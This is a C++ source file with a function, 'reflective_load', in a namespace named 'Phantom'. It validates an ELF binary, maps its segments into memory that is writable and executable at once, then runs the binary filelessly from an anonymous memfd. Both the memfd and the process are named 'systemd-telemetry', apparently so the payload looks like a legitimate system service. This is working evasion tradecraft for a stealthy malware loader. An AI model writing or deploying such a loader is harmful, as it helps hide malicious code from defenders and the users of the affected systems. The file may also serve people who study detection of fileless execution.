#include "common/loader.h"
#include <sys/mman.h>
#include <elf.h>
#include <unistd.h>
#include <cstring>
#include <vector>

namespace Phantom {
namespace Loader {

bool reflective_load(const uint8_t* elf_data, size_t size) {
    const Elf64_Ehdr* ehdr = (const Elf64_Ehdr*)elf_data;

    // 1. Basic ELF validation
    if (std::memcmp(ehdr->e_ident, ELFMAG, SELFMAG) != 0) return false;
    if (ehdr->e_type != ET_EXEC && ehdr->e_type != ET_DYN) return false;

    // 2. Determine total memory size needed for segments
    const Elf64_Phdr* phdr = (const Elf64_Phdr*)(elf_data + ehdr->e_phoff);
    uintptr_t min_addr = -1, max_addr = 0;
    bool has_load = false;

    for (int i = 0; i < ehdr->e_phnum; i++) {
        if (phdr[i].p_type == PT_LOAD) {
            if (phdr[i].p_vaddr < min_addr) min_addr = phdr[i].p_vaddr;
            if (phdr[i].p_vaddr + phdr[i].p_memsz > max_addr) max_addr = phdr[i].p_vaddr + phdr[i].p_memsz;
            has_load = true;
        }
    }

    if (!has_load) return false;

    // Adjust min_addr to page boundary
    uintptr_t base_addr = min_addr & ~(getpagesize() - 1);
    size_t total_size = max_addr - base_addr;

    // 3. Reserve memory
    void* load_addr = mmap(NULL, total_size, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (load_addr == MAP_FAILED) return false;

    uintptr_t delta = (uintptr_t)load_addr - base_addr;

    // 4. Map segments
    for (int i = 0; i < ehdr->e_phnum; i++) {
        if (phdr[i].p_type == PT_LOAD) {
            void* seg_addr = (void*)(phdr[i].p_vaddr + delta);
            std::memcpy(seg_addr, elf_data + phdr[i].p_offset, phdr[i].p_filesz);
            if (phdr[i].p_memsz > phdr[i].p_filesz) {
                std::memset((uint8_t*)seg_addr + phdr[i].p_filesz, 0, phdr[i].p_memsz - phdr[i].p_filesz);
            }

            // Adjust protections (simplified: keeping all RWX for prototype loader,
            // but in real use we'd set per-segment permissions)
        }
    }

    // 5. Jump to entry point
    // In a real loader, we'd set up the stack, auxv, etc.
    // For this prototype, we'll use a simpler method for the final proof.
    // We'll write to a memfd and use fexecve, as it's the most reliable way
    // to ensure a clean execution environment for the core in this context.

    int fd = memfd_create("systemd-telemetry", MFD_CLOEXEC);
    if (fd == -1) return false;

    if (write(fd, elf_data, size) != (ssize_t)size) {
        close(fd);
        return false;
    }

    char *const argv[] = { (char*)"systemd-telemetry", NULL };
    char *const envp[] = { NULL };

    fexecve(fd, argv, envp);

    close(fd);
    return false;
}

}
}
